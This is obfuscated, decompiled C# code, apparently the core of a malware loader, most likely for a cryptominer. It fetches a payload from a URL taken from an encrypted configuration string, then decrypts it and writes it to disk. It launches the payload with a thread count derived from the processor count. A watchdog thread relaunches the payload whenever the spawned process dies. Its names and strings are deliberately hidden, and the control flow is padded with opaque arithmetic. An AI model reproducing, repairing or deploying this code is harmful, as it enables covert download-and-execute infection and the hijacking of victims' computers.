using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

[StandardModule]
internal sealed class ________________________
{
	public static int _;

	static ________________________()
	{
		________________________._ = 0;
	}

	public static void _()
	{
		int num;
		string str = null;
		int _______ = 0;
		int length;
		string str1 = null;
		string[] strArrays = null;
		byte[] numArray = null;
		int num1 = 0;
		int num2;
		object obj;
		int length1;
		try
		{
		Label12:
			________________________.____();
			string str2 = __________________________________________________________________.____(<Module>.______<string>(-439122892));
			string str3 = str2;
			num = A.i0;
			if (1409286144 * num - 1468 + -4923 != -num + num)
			{
				num2 = (15812 + (num / 52870 + 88 >> 29) != 5 * num + num * 3 ? (int)(sizeof(byte) + 22546) : Type.EmptyTypes.Length + -1694156197);
			}
			else
			{
				num2 = (int)(sizeof(double) + 1974406803);
			}
			if (Operators.CompareString(str3, <Module>.__________(num2, (int)(sizeof(uint) + 23682), 105), false) == 0 | Operators.CompareString(str2, <Module>._______<string>(-2124384702), false) == 0)
			{
				goto Label0;
			}
			strArrays = Strings.Split(str2, <Module>.___<string>(-1052575738), -1, CompareMethod.Binary);
		Label4:
			do
			{
				str1 = strArrays[2];
				if (!str1.Contains(<Module>._______<string>(1091163632)))
				{
					goto Label1;
				}
			}
			while ((~(A.i0 / 24460871) & 134221207) == 0);
			obj = Type.EmptyTypes.Length + 4;
			goto Label2;
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>._____<string>(-1723325216), string.Concat(<Module>.______<string>(-204235303), exception.ToString()));
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
		length = 10117;
		_______ = <Module>.C;
		if (((_______ << 17) / 512 | -1979711534) == -1979711534)
		{
			return;
		}
	Label11:
		WebClient webClient = new WebClient();
		numArray = ___________________________________________________________________._______(webClient.DownloadData(strArrays[0]), <Module>._____<string>(1822288094));
		if (_______ * 4 + _______ * 12 == -9155)
		{
			obj = Type.EmptyTypes.Length + -1831708294;
		}
		else
		{
			obj = sizeof(Guid) + -16;
		}
	Label2:
		while (true)
		{
			switch (obj)
			{
				case 0:
				{
					numArray = ________________________________________________________________________________.______(numArray);
					string str4 = str;
					byte[] numArray1 = numArray;
					uint num3 = sizeof(float) + -134;
					int _______1 = <Module>.C;
					if (2097152 * (_______1 << 18) + -2147483648 == (_______1 << 8) / 256)
					{
						length1 = Type.EmptyTypes.Length + 837466095;
					}
					else
					{
						int ______ = <Module>.__________;
						length1 = (107 * ______ + ______ * 149 != 3693 ? Type.EmptyTypes.Length + 512 : (int)(sizeof(ulong) + -2038991469));
					}
					File.WriteAllBytes(str4, ___________________________________________________________________._______(numArray1, <Module>.__________((int)num3, length1, ((_______1 / 459201431 + 1003 ^ -1831164742) == 0 ? (int)(sizeof(double) + 267480272) : Type.EmptyTypes.Length + 59))));
					goto case 2;
				}
				case 2:
				{
					______________________________________________________________.______________(<Module>.___<string>(982404538), string.Concat(<Module>.______<string>(867525750), strArrays[1]));
					obj = Type.EmptyTypes.Length + 3;
					continue;
				}
				case 3:
				{
					goto Label5;
				}
				case 4:
				{
					str1 = str1.Replace(<Module>.____<string>(322744478), ________________________.___(strArrays[3]));
					length = Type.EmptyTypes.Length + -5286;
					if ((num % 84942 | 635699199) != 635699199)
					{
						if ((-8421 ^ num1 + 15 * num1) == 0)
						{
							goto Label4;
						}
						obj = Type.EmptyTypes.Length + -1264448964;
						continue;
					}
					else
					{
						obj = sizeof(Guid) + -11;
						continue;
					}
				}
				case 5:
				{
					goto Label1;
				}
				case 6:
				{
					break;
				}
				default:
				{
					goto Label4;
				}
			}
		}
		if (!_______________________________________________________________________.___________(_____________________________________________________________________________.__, str1, File.ReadAllBytes(str), true, true, true))
		{
			______________________________________________________________.______________(<Module>.___<string>(1387161447), <Module>.____<string>(-1194868352));
		}
		Thread.Sleep(5000);
		(new Thread(new ThreadStart(________________________.__))).Start();
		return;
	Label1:
		length = -5286;
		str = string.Concat(______________________.____, strArrays[1]);
		if (!File.Exists(str))
		{
			goto Label9;
		}
	Label5:
		________________________._ = 1;
		if (_______________________________________________________________________.___________(_____________________________________________________________________________.__, str1, File.ReadAllBytes(str), false, true, true))
		{
			Thread.Sleep(5000);
			(new Thread(new ThreadStart(________________________.__))).Start();
			return;
		}
		obj = Type.EmptyTypes.Length + 6;
		goto Label2;
	Label9:
		if (length == -5286)
		{
			if ((1 & length + -5548) == (1 & -length))
			{
				goto Label11;
			}
			goto Label12;
		}
		else
		{
			goto Label12;
		}
	}

	public static void __()
	{
		while (true)
		{
			try
			{
				if (________________________._ >= 3)
				{
					Process.GetProcessById(________________________._);
					Thread.Sleep(5000);
				}
				else
				{
					break;
				}
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				________________________._ = 0;
				________________________._();
				ProjectData.ClearProjectError();
				break;
			}
		}
	}

	public static string ___(string string_0)
	{
		string str = null;
		int length;
		try
		{
			int processorCount = Environment.ProcessorCount;
			if (processorCount == 1)
			{
				str = <Module>.______<string>(-40396910);
				length = Type.EmptyTypes.Length + 3;
			}
			else if (processorCount == 3)
			{
				str = <Module>._______<string>(1155951011);
				return str;
			}
			else if (Operators.CompareString(string_0, <Module>._____<string>(1824143085), false) == 0)
			{
				length = Type.EmptyTypes.Length + 0;
			}
			else if (Operators.CompareString(string_0, <Module>._____<string>(-1195438442), false) == 0)
			{
				length = Type.EmptyTypes.Length + 2;
			}
			else if (Operators.CompareString(string_0, <Module>.______<string>(-1872088398), false) != 0)
			{
				str = <Module>.____<string>(1467947727);
				return str;
			}
			else
			{
				str = (processorCount - 1).ToString();
				return str;
			}
			while (true)
			{
				switch (length)
				{
					case 0:
					{
						str = processorCount.ToString();
						return str;
					}
					case 1:
					{
						break;
					}
					case 2:
					{
						str = ((double)processorCount / 2).ToString();
						length = Type.EmptyTypes.Length + 1;
						continue;
					}
					case 3:
					{
						return str;
					}
					default:
					{
						return str;
					}
				}
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			str = <Module>.______<string>(-40396910);
			ProjectData.ClearProjectError();
		}
		return str;
		return str;
	}

	public static void ____()
	{
		try
		{
			if (________________________._ >= 3)
			{
				Process.GetProcessById(________________________._).Kill();
				________________________._ = 0;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}
}